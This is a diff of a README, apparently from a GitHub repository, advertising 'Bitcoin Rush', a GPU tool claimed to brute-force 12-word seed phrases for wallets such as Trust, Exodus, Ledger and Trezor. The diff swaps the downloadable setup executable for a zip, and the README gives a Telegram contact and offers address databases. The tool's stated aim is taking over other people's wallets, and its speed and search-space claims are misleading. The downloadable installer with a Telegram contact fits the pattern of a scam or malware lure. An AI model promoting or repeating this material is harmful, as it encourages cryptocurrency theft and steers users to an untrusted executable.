@@ -1,6 +1,6 @@
 # Mnemonic (12 words seed) GPU-generator BIP-32, BIP-44, BIP-84
 
-[Bitcoin Rush v 1.1](https://github.com/Crypt0hunter/Mnemonic-seed-generator-BIP-32-BIP-44-BIP-84/releases/download/1.1/BitcoinRush-setup-x64.exe)
+[Bitcoin Rush v 1.1](https://github.com/Crypt0hunter/BitcoinRush/releases/download/1.1/BitcoinRush-setup-x64.zip)
 
 https://t.me/cryptohunt222
 
@@ -13,7 +13,7 @@ This is amazing speed vs CPU type generators, them get only 100-5000 mnemonics p
 ![screen](https://user-images.githubusercontent.com/127986549/225644967-78a3596e-4934-4881-9de2-6f7851dd33b8.jpg)
 Just look to this picture - this is very small range from 1 to 2^132 then range for legacy btc addresses 1 to 2^256. And also important - when we searching mnemonic we find master key for all next addresses by this mnemonic words, when we searching privkey in HEX we find only one address! 
 
-The Programm [Bitcoin Rush v 1.1](https://github.com/Crypt0hunter/Mnemonic-seed-generator-BIP-32-BIP-44-BIP-84/releases/download/1.1/BitcoinRush-setup-x64.exe) supported most types path of desktop and mobile wallets as Trust wallet, Exodus wallet, etc. Ledger and Trezor which using 12 words without passphrase.
+The Programm [Bitcoin Rush v 1.1](https://github.com/Crypt0hunter/BitcoinRush/releases/download/1.1/BitcoinRush-setup-x64.zip) supported most types path of desktop and mobile wallets as Trust wallet, Exodus wallet, etc. Ledger and Trezor which using 12 words without passphrase.
 
 We can add the functions and tools you need (other derivation paths, different coins BCH, ETH, Doge, Litecoin etc.). You will be provided with up-to-date address databases.
 
